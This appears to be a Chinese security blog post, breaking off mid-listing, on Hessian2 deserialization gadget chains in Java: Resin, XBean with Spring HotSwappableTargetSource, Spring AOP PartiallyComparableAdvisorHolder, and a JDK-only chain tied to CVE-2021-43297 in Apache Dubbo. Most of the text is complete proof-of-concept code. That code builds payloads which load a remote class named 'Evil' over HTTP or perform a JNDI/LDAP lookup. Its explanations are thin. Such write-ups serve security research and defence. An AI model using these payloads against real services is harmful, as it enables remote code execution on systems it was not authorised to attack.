<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(<span class="keyword">new</span> <span class="title class_">InitialContext</span>(),<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//设置为相同的hashcode，使hash 比较通过，从而触发 XString equals方法。</span></span><br><span class="line">     <span class="type">String</span> <span class="variable">sameHashCode</span> <span class="operator">=</span> unhash(qName.hashCode());</span><br><span class="line">     <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(sameHashCode);</span><br><span class="line"></span><br><span class="line">     <span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">     expMap.put(qName, <span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">     expMap.put(xString, <span class="string">&quot;cirno&quot;</span>);</span><br><span class="line">     setFieldValue(qName,<span class="string">&quot;_context&quot;</span>,continuationContext);</span><br></pre></td></tr></table></figure></div>

<p>进行反序列化触发的内容分析如下：</p>
<p><strong>HashMap 的 putval 实现是通过红黑树实现的，具体分析就不做分析了（以我现在的水平也懒得费时分析，过于费时费事），我就用最直观的数据做分析即可。我们利用的最关键的代码是</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br></pre></td></tr></table></figure></div>

<p>Hessian2 进行 HashMap 的填充为如下代码</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">((Map)map).put(in.readObject(), in.readObject());</span><br></pre></td></tr></table></figure></div>

<p>触发put为（这个 key 就是 putval 里面的 key）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>

<p>putval 中 p一开始为 null，于是 newNode 创建新node，记录第一个node数据，该node为我们的包裹QName的键值对。后续第二次putval，读取的是第二个键值对，此时 p.key 为QName，key 为 Xstring，由于之前设置了hash值相等，此时可以通过 p.hash &#x3D;&#x3D; hash 校验，进而进入 (k &#x3D; p.key) &#x3D;&#x3D; key 的判断，此时 k 被赋值为了 QName，不等于key，进而触发 Xstring.equals(QName)。</p>
<p><strong>所以put的顺序需要关注</strong></p>
<h3 id="针对第二个问题"><a href="#针对第二个问题" class="headerlink" title="针对第二个问题"></a>针对第二个问题</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230210175124400.png"
                      alt="image-20230210175124400"
                ></p>
<p>自己懒得调了，有兴趣的可以试试。我是懒狗</p>
<h1 id="XBean-配合-Hessian2（还是需要spring）"><a href="#XBean-配合-Hessian2（还是需要spring）" class="headerlink" title="XBean 配合 Hessian2（还是需要spring）"></a>XBean 配合 Hessian2（还是需要spring）</h1><p>这条链子和Resin链很相似，只不过是在 XBean 中找到了类似功能的实现，依赖随便选择一个就行。</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>首先还是用 XString 触发 <code>ContextUtil.ReadOnlyBinding</code> 的 toString 方法（实际继承 <code>javax.naming.Binding</code>），toString 方法调用 getObject 方法获取对象。</p>
<h2 id="分析-Binding-toString远程类加载"><a href="#分析-Binding-toString远程类加载" class="headerlink" title="分析-Binding toString远程类加载"></a>分析-Binding toString远程类加载</h2><p>在反序列化开始时，还是和 Resin 一样，在读取 put 第二个Node 的时候，需要通过 hash 相等的校验才能进行后续的 equals 方法。但是 HotSwappableTargetSource 它的 hashcode 方法进行了重写，处理方式为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> HotSwappableTargetSource.class.hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>也就是说，我们两个 HotSwappableTargetSource 类不需要之前那种设置 hash，直接就会判断为相等。</p>
<p>然后就可以继续触发 Binding 的 toString 方法，最终实现远程类加载</p>
<p>这个不用咋分析了，大致调一下就能看明白。</p>
<h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> XBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.naming.context.ContextUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.naming.context.WritableContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XBean_POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">remoteUrl</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8088/&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">remoteClass</span> <span class="operator">=</span> <span class="string">&quot;Evil&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> createWithoutConstructor(WritableContext.class);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;foo&quot;</span>, remoteClass, remoteUrl);</span><br><span class="line">        ContextUtil.<span class="type">ReadOnlyBinding</span> <span class="variable">binding</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContextUtil</span>.ReadOnlyBinding(<span class="string">&quot;foo&quot;</span>, ref, ctx);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(binding);</span><br><span class="line">        <span class="comment">// 设置一个人畜无害内容</span></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(hotSwappableTargetSource1,hotSwappableTargetSource1);</span><br><span class="line">        hashMap.put(hotSwappableTargetSource2,hotSwappableTargetSource2);</span><br><span class="line">        <span class="comment">// 反射修改回来</span></span><br><span class="line">        setFieldValue(hotSwappableTargetSource2,<span class="string">&quot;target&quot;</span>,<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;koishi&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hessian 序列化数据</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        hessianOutput.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessianOutput.writeObject(hashMap);</span><br><span class="line">        <span class="type">byte</span>[] serializedData = byteArrayOutputStream.toByteArray();</span><br><span class="line">        System.out.println(<span class="string">&quot;Hessian 序列化数据为: &quot;</span> + Base64.getEncoder().encodeToString(serializedData));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hessian 反序列化数据</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serializedData);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hessianInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">        hessianInput.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">            <span class="string">&quot;unchecked&quot;</span></span><br><span class="line">    &#125; )</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes,</span></span><br><span class="line"><span class="params">                                                Object[] consArgs )</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> ( field != <span class="literal">null</span> )</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( clazz.getSuperclass() != <span class="literal">null</span> )</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( NoSuchFieldException e ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>这里再对 HotSwappableTargetSource 做一个记录算了</p>
<h2 id="HotSwappableTargetSource-利用思路归纳"><a href="#HotSwappableTargetSource-利用思路归纳" class="headerlink" title="HotSwappableTargetSource 利用思路归纳"></a>HotSwappableTargetSource 利用思路归纳</h2><p>HotSwappableTargetSource 创建两个实例a，b，分别依次放入HashMap中，当HashMap触发putval方法时（原生反序列化、Hessian2都可），都会实现以下内容。</p>
<p><strong>当代码形式如下时</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">      <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(a);</span><br><span class="line">      <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(b);</span><br><span class="line"></span><br><span class="line">HashMap的node1-&gt;hotSwappableTargetSource1</span><br><span class="line">HashMap的node2-&gt;hotSwappableTargetSource2</span><br></pre></td></tr></table></figure></div>

<p>会执行<font color="red"> **b.equals(a) **</font></p>
<p>目前 b 的主流为 <strong>XString</strong></p>
<ul>
<li>XString 触发 equals 会接着触发 a 的 toString方法，目前搭配常见的 a 一般为 Rome 的 toStringBean</li>
</ul>
<p>（唯一缺陷就是需要Spring依赖）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br></pre></td></tr></table></figure></div>





<h1 id="Spring-Context-AOP"><a href="#Spring-Context-AOP" class="headerlink" title="Spring Context &amp; AOP"></a>Spring Context &amp; AOP</h1><h2 id="PartiallyComparableAdvisorHolder"><a href="#PartiallyComparableAdvisorHolder" class="headerlink" title="PartiallyComparableAdvisorHolder"></a>PartiallyComparableAdvisorHolder</h2><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>





<p><strong>payload</strong></p>
<p>懒得分析，以后看spring的反序列化再细究</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Spring_AOP_AND_Context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Tool.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.logging.impl.NoOpLog;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AbstractAspectJAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJAroundAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJPointcutAdvisor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jndi.support.SimpleJndiBeanFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PartiallyComparableAdvisorHolder_POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/lgvcm1&quot;</span>;</span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">        bf.setShareableResources(jndiUrl);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化时BeanFactoryAspectInstanceFactory.getOrder会被调用，会触发调用SimpleJndiBeanFactory.getType-&gt;SimpleJndiBeanFactory.doGetType-&gt;SimpleJndiBeanFactory.doGetSingleton-&gt;SimpleJndiBeanFactory.lookup-&gt;JndiTemplate.lookup</span></span><br><span class="line">        Reflections.setFieldValue(bf, <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        Reflections.setFieldValue(bf.getJndiTemplate(), <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化时AspectJAroundAdvice.getOrder会被调用，会触发BeanFactoryAspectInstanceFactory.getOrder</span></span><br><span class="line">        <span class="type">AspectInstanceFactory</span> <span class="variable">aif</span> <span class="operator">=</span> Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);</span><br><span class="line">        Reflections.setFieldValue(aif, <span class="string">&quot;beanFactory&quot;</span>, bf);</span><br><span class="line">        Reflections.setFieldValue(aif, <span class="string">&quot;name&quot;</span>, jndiUrl);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化时AspectJPointcutAdvisor.getOrder会被调用，会触发AspectJAroundAdvice.getOrder</span></span><br><span class="line">        <span class="type">AbstractAspectJAdvice</span> <span class="variable">advice</span> <span class="operator">=</span> Reflections.createWithoutConstructor(AspectJAroundAdvice.class);</span><br><span class="line">        Reflections.setFieldValue(advice, <span class="string">&quot;aspectInstanceFactory&quot;</span>, aif);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化时PartiallyComparableAdvisorHolder.toString会被调用，会触发AspectJPointcutAdvisor.getOrder</span></span><br><span class="line">        <span class="type">AspectJPointcutAdvisor</span> <span class="variable">advisor</span> <span class="operator">=</span> Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);</span><br><span class="line">        Reflections.setFieldValue(advisor, <span class="string">&quot;advice&quot;</span>, advice);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化时Xstring.equals会被调用，会触发PartiallyComparableAdvisorHolder.toString</span></span><br><span class="line">        Class&lt;?&gt; pcahCl = Class.forName(<span class="string">&quot;org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">pcah</span> <span class="operator">=</span> Reflections.createWithoutConstructor(pcahCl);</span><br><span class="line">        Reflections.setFieldValue(pcah, <span class="string">&quot;advisor&quot;</span>, advisor);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化时HotSwappableTargetSource.equals会被调用，触发Xstring.equals</span></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(pcah);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;koishi&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化时HashMap.putVal会被调用，触发HotSwappableTargetSource.equals。这里没有直接使用HashMap.put设置值，直接put会在本地触发利用链，所以使用marshalsec使用了比较特殊的处理方式。</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> Reflections.NoLocalExecuteMap(v1,v2);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        hessianOutput.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessianOutput.writeObject(hashMap);</span><br><span class="line">        <span class="type">byte</span>[] serializedData = byteArrayOutputStream.toByteArray();</span><br><span class="line">        System.out.println(<span class="string">&quot;Hessian 序列化数据为: &quot;</span> + Base64.getEncoder().encodeToString(serializedData));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hessian 反序列化数据</span></span><br><span class="line">        <span class="comment">// 高版本下的jndi注入需求</span></span><br><span class="line">        <span class="comment">// System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serializedData);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hessianInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">        hessianInput.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="🚩-OnlyJDK-利用-重要-🚩"><a href="#🚩-OnlyJDK-利用-重要-🚩" class="headerlink" title="🚩 OnlyJDK 利用(重要)🚩"></a>🚩 OnlyJDK 利用(重要)🚩</h1><h2 id="–利用任意类toString–"><a href="#–利用任意类toString–" class="headerlink" title="–利用任意类toString–"></a>–利用任意类toString–</h2><h3 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h3><p>以上的payload实质上都是将其他反序列化的利用链改造了而已，这里讲的内容不需要任何其他依赖即可利用。</p>
<p>通过tabby，可以找到两个可以直接利用toString的链子，具体为什么要这样找，看我的2022 0ctf-hessian2 onlyjdk</p>
<p>[0ctf-hessian2 onlyjdk ownWriteUp](R:\Competition questions\0ctf2022\ownsolve\0ctf_hessian2_solved.md)</p>
<div class="highlight-container" data-rel="Ceylon"><figure class="iseeu highlight ceylon"><table><tr><td class="code"><pre><span class="line">match path=(m<span class="number">1</span>:Method&#123;NAME:<span class="string">&#x27;toString&#x27;</span>&#125;)-[:CALL*..<span class="number">3</span>]-&gt;(sink:Method&#123;NAME:<span class="string">&quot;get&quot;</span>&#125;) WHERE sink.CLASSNAME =~ <span class="string">&quot;.*Hashtable&quot;</span> <span class="keyword">return</span> path</span><br></pre></td></tr></table></figure></div>

<p>分别是</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">javax.activation.MimeTypeParameterList#toString</span><br><span class="line">sun.security.pkcs.PKCS9Attributes#toString</span><br></pre></td></tr></table></figure></div>



<p>由于这里toString 本质上利用的是 CVE-2021-43297 ， 因此需要注意一下dubbo版本范围。hessian的情况下，注意看看expect方法是否被修改即可。</p>
<table>
<thead>
<tr>
<th>组件</th>
<th>影响版本</th>
<th>安全版本</th>
</tr>
</thead>
<tbody><tr>
<td>Apache Dubbo 2.6.x</td>
<td>&lt; 2.6.12</td>
<td>2.6.12</td>
</tr>
<tr>
<td>Apache Dubbo 2.7.x</td>
<td>&lt; 2.7.15</td>
<td>2.7.15</td>
</tr>
<tr>
<td>Apache Dubbo 3.0.x</td>
<td>&lt; 3.0.5</td>
<td>3.0.5</td>
</tr>
</tbody></table>
<p><strong>然后就是几个关键类及其方法</strong></p>
<h2 id="①MethodUtils-invoke"><a href="#①MethodUtils-invoke" class="headerlink" title="①MethodUtils  invoke"></a>①MethodUtils  invoke</h2><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Tool.Reflections;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attribute;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attributes;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.activation.MimeTypeParameterList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MethodUtils_invoke</span> &#123;</span><br><span class="line">    <span 